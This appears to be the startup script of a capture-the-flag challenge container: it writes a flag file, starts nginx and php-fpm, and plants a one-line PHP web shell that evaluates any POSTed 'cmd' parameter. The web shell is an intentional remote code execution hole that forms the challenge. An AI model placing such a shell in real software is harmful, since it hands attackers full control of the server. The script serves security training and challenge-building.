#!/bin/sh

# Write the (platform-injected) flag; fall back to a local default for testing.
DEFAULT_FLAG="pwnsec{local_test_flag}"
echo "${FLAG:-$DEFAULT_FLAG}" > /flag
chmod 644 /flag

echo '<?php eval($_POST["cmd"]); ' > /home/ctf/scripts/index.php
nginx
/app/php-bin/sbin/php-fpm -c /app/php-bin/etc/php.ini --nodaemonize
